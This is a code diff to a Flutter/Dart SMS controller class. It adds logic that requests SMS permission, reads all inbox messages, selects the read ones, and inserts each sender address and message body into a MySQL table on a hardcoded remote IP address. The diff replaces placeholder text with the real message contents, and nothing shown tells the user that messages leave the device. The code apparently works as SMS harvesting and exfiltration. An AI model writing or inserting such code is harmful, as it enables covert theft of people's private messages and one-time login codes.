@@ -13,6 +13,7 @@ class SmSController extends GetxController {
   final box = GetStorage();
   var isLoading = false.obs;
   var messages = <SmsMessage>[].obs;
+  var isRead = <SmsMessage>[].obs;
   var isloadingSetData = false.obs;
   var switchVlaue = false.obs;
   var permission = false.obs;
@@ -25,13 +26,17 @@ class SmSController extends GetxController {
     super.onReady();
   }
 
-  void getInboxSms() async {
+  Future<void> getInboxSms() async {
     isLoading.value = true;
     permissionStatus = await Permission.sms.status;
     if (!permissionStatus.isGranted) {
-      await Permission.sms.request();
+      Future.delayed(const Duration(seconds: 2), () async {
+        await Permission.sms.request();
+      });
     } else if (permissionStatus.isGranted) {
+      await Permission.sms.request();
       messages.value = await query.getAllSms;
+      messagesIsRead();
     }
     isLoading.value = false;
     update();
@@ -46,6 +51,10 @@ class SmSController extends GetxController {
   void connectDatabaseValue() {
     switchVlaue.value = box.read('key') ?? false;
     log('switchVlaue $switchVlaue.value');
+  }
+
+  void messagesIsRead() {
+    isRead.value = messages.where((value) => value.isRead == true).toList();
   }
 
   static String host = '154.0.171.145',
@@ -90,17 +99,15 @@ class SmSController extends GetxController {
     var db = getConnection();
     String sql =
         'insert into TblMahmoud (txtSmsText) values (?) ON DUPLICATE KEY UPDATE txtSmsText=txtSmsText';
-    // String sql = 'insert into TblMahmoud (txtSmsText) values (?)';
-    final List<String> mylist = [
-      'Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry',
-    ];
 
     await db.then((conn) async {
-      for (var value in mylist) {
+      for (var value in isRead) {
         await conn
             .query(
               sql,
-              [value.toString()],
+              [
+                "address : ${value.address.toString()} , Body : ${value.body.toString()}"
+              ],
             )
             .then((results) {})
             .onError((error, stackTrace) {
